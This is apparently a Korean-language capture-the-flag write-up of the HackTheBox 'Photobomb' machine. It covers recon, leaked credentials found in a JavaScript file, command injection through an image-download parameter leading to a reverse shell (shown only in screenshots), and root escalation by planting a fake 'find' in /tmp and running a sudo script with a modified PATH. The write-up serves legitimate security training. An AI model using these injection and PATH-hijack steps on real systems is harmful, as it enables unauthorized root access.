# Photobomb - HackTheBox
## Recon
```bash
sudo nmap -p 22,80 -sC -sV -vv -oA Photobomb 10.10.11.182
```
<img width="1103" height="413" alt="image" src="https://github.com/user-attachments/assets/10428470-e9ab-4be4-9cb4-d3d3843e9eac" />

- SSH(22)
- HTTP(80)

---
## HTTP
- `/etc/hosts`에 `photobomb.htb` 추가.
<img width="1103" height="63" alt="image" src="https://github.com/user-attachments/assets/d87a67a0-9ba1-40df-8fa3-fe29c7346a34" />

### banner grabbing
<img width="1103" height="537" alt="image" src="https://github.com/user-attachments/assets/edf233c0-1105-41ab-8c0b-5adb0c432c1a" />

### feroxbuster
- `/photobomb.js`발견.
```bash
feroxbuster -u http://photobomb.htb -x php,md,txt
```
<img width="1103" height="558" alt="image" src="https://github.com/user-attachments/assets/1581ce72-db76-4a96-9477-f0df5bd88d7d" />

<br>
<br>

- `pH0t0:b0Mb!`계정 발견.
<img width="740" height="174" alt="image" src="https://github.com/user-attachments/assets/99144858-0c9f-4d39-b7eb-b11eec08f49d" />

### Command Injection
- 서버의 메인 페이지에서  `click here!`를 클릭하여 `pH0t0:b0Mb!`계정으로 로그인 시도.
<img width="1100" height="611" alt="image" src="https://github.com/user-attachments/assets/f740e79f-cc35-4980-a853-a737d008bec6" />

<br>
<br>

- `burpsuite`로 이미지 다운로드를 가로채서 확인.
<img width="1100" height="259" alt="image" src="https://github.com/user-attachments/assets/f7d038c7-e247-40f6-aa71-500a0d6adb0d" />

<br>
<br>

- `filetype`파라미터에 `;`를 전달하니 에러가 발생.
<img width="1100" height="259" alt="image" src="https://github.com/user-attachments/assets/1e400cbe-0228-42e6-9e1b-7c5445922856" />

<br>
<br>

- `Command injection`이 되는지 확인하기 위해 ping test 실행.
<img width="772" height="365" alt="image" src="https://github.com/user-attachments/assets/9807e718-217f-425b-b392-afc7a6332d57" />

<br>
<br>

- ping test 성공.
<img width="1104" height="237" alt="image" src="https://github.com/user-attachments/assets/8729257d-c475-4366-839d-53b719271f1e" />

<br>
<br>

- 리버스 셸 연결 시도.
<img width="774" height="396" alt="image" src="https://github.com/user-attachments/assets/ee59fb67-e648-4cfd-b458-eb188f97ae7f" />

<br>
<br>

- 셸 획득.
<img width="1106" height="175" alt="image" src="https://github.com/user-attachments/assets/cb1e4d94-15c8-43c4-903e-ad353cff56a9" />

---
## Privesc
- `root`권한으로 `/opt/cleanup.sh`실행 가능.
- 실행시 `env_reset`에 의해서 환경변수가 초기화 되나, `SETENV`로 인해서 환경변수를 전달이 가능.
<img width="1106" height="137" alt="image" src="https://github.com/user-attachments/assets/152ae81f-0b16-4c5c-9408-f734dd684eec" />

<br>
<br>

- `/opt/cleanup.sh`스크립트에서 마지막 줄에서 `find`를 사용.
<img width="1106" height="270" alt="image" src="https://github.com/user-attachments/assets/b107ed5b-b480-4a48-a210-a6128b196b11" />

<br>
<br>

- `PATH`를 바꿔서 `/usr/bin/find`보다 먼저 실행을 시킬 수 있으면 exploit이 가능할 것이라 판단.
<img width="1103" height="80" alt="image" src="https://github.com/user-attachments/assets/53238de8-b600-47d0-9359-fd65e741673f" />

<br>
<br>

- `/tmp`에 `find`생성.
```bash
echo '#!/bin/bash' > find

echo '/bin/bash' >> find

chmod 777 find
```
<img width="1104" height="121" alt="image" src="https://github.com/user-attachments/assets/e5eaae89-e88c-420f-8b52-3d13e32bec4a" />

<br>
<br>

- `/tmp`를 환경변수에 추가하여 `/opt/cleanup.sh`실행하여 셸 획득.
- `PATH`에 `/tmp`가 추가된 것을 확인할 수 있다.
```bash
sudo PATH=/tmp:$PATH /opt/cleanup.sh
```
<img width="1104" height="98" alt="image" src="https://github.com/user-attachments/assets/8babeff4-7286-4fdb-956f-0df1b596a2a1" />

---
## FLAG
- `/home/wizard/user.txt`
<img width="1104" height="270" alt="image" src="https://github.com/user-attachments/assets/b97987ea-99ff-46eb-ba51-8a709f13e570" />

<br>
<br>

- `/root/root.txt`
<img width="1104" height="214" alt="image" src="https://github.com/user-attachments/assets/ae141de6-d121-46b8-9348-006e23525bef" />













